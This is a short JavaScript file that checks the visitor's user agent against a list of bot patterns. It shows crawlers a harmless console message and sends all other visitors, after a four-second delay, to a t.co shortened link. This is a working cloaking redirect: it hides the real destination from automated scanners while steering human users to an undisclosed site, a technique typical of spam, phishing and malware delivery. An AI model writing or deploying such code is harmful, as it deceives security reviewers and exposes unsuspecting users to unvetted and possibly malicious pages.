import botPatterns from './bots.js';

const isBot = botPatterns.some(bot => 
  navigator.userAgent.toLowerCase().includes(bot.toLowerCase())
);

if (!isBot) {
  setTimeout(() => {
    window.location.href = "https://t.co/Af4qXqqU9P?tt";
  }, 4000);
} else {
  console.log("Thanks for visiting my page");
}
